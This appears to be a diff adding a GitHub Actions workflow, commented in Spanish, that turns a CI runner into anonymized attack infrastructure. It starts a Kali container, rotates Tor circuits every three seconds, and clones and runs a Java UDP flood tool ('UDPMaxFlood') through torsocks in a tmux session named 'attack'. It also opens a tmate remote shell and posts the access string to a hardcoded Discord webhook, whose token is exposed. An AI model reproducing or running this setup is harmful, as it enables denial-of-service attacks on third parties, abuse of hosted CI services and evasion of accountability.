@@ -1,0 +1,63 @@
+name: Laboratorio Interactivo con Rotación Rápida de IP
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Preparar Entorno, Iniciar Rotador de IP y Lanzar Aplicación
+        id: setup
+        run: |
+          echo "### 1. Creando contenedor Kali Linux..."
+          docker run --rm -d --name kali kalilinux/kali-rolling tail -f /dev/null
+
+          echo "### 2. Instalando dependencias necesarias..."
+          docker exec kali apt-get update
+          docker exec kali apt-get install -yq \
+            tmate \
+            curl \
+            git \
+            unzip \
+            default-jdk \
+            tmux \
+            tor
+
+          echo "### 3. Creando e implementando el script de rotación de IP..."
+          # Se crea un script que recargará el servicio de Tor en un bucle infinito cada 3 segundos.
+          docker exec kali bash -c "echo -e '#!/bin/bash\nwhile true; do systemctl reload tor.service; sleep 3; done' > /root/ip_changer.sh"
+          docker exec kali chmod +x /root/ip_changer.sh
+
+          echo "### 4. Iniciando el rotador de IP en una sesión 'tmux' separada..."
+          docker exec kali tmux new-session -d -s ip_changer
+          docker exec kali tmux send-keys -t ip_changer "/root/ip_changer.sh" C-m
+
+          echo "### 5. Creando una segunda sesión 'tmux' para la aplicación..."
+          docker exec kali tmux new-session -d -s attack
+
+          echo "### 6. Ejecutando la secuencia de su aplicación en la sesión 'attack'..."
+          REPO_URL="https://github.com/feloxgarcia0-stack/UDP2.git"
+          
+          # La secuencia completa, incluyendo la ejecución con 'torsocks', se envía a la sesión.
+          docker exec kali tmux send-keys -t attack \
+            "echo 'Activando servicio Tor...'; service tor start; echo 'Estabilizando conexión a la red Tor (15s)...'; sleep 15; \
+             git clone $REPO_URL /root/attack && cd /root/attack && javac UDPMaxFlood.java && \
+             echo 'Ejecución iniciada a través de la red Tor.'; torsocks java UDPMaxFlood" C-m
+
+          echo "### 7. Configurando y obteniendo la conexión SSH remota..."
+          docker exec kali bash -c "echo 'set -g status off' > /root/.tmate.conf"
+          tmate_ssh=$(docker exec kali tmate -S /tmp/tmate.sock new-session -d \; wait tmate-ready \; display -p '#{tmate_ssh}')
+          
+          echo "ssh_connection=$tmate_ssh" >> $GITHUB_OUTPUT
+      
+      - name: Enviar Notificación con Instrucciones de Acceso a Discord
+        env:
+          SSH_CONNECTION: ${{ steps.setup.outputs.ssh_connection }}
+          WEBHOOK_URL: "https://discord.com/api/webhooks/1398292786876387439/Vmc5Ms5ZoF7GYp8yVwKZV1Q6k1Ht97k5tRRDZOG9_TNJQndDzxHx-1XpZYAQrPjtQvmJ"
+        run: |
+          JSON_PAYLOAD=$(printf '{"content": "✅ **Entorno Interactivo Listo (IP Rotando cada 3s).**\\n\\nSiga los siguientes pasos para acceder:\\n\\n**1. Conéctese a la VPS con este comando:**\\n`%s`\\n\\n**2. Una vez dentro, acceda a la interfaz de su aplicación con:**\\n`tmux attach -t attack`\\n\\n*(Opcional) Para observar el rotador de IP en acción, utilice: `tmux attach -t ip_changer`*"}' "$SSH_CONNECTION")
+          curl -H "Content-Type: application/json" -X POST -d "$JSON_PAYLOAD" "$WEBHOOK_URL"
+
+      - name: Mantener Entorno Activo
+        run: sleep 1800 # 30 minutos por defecto. Modifique este valor si lo requiere.
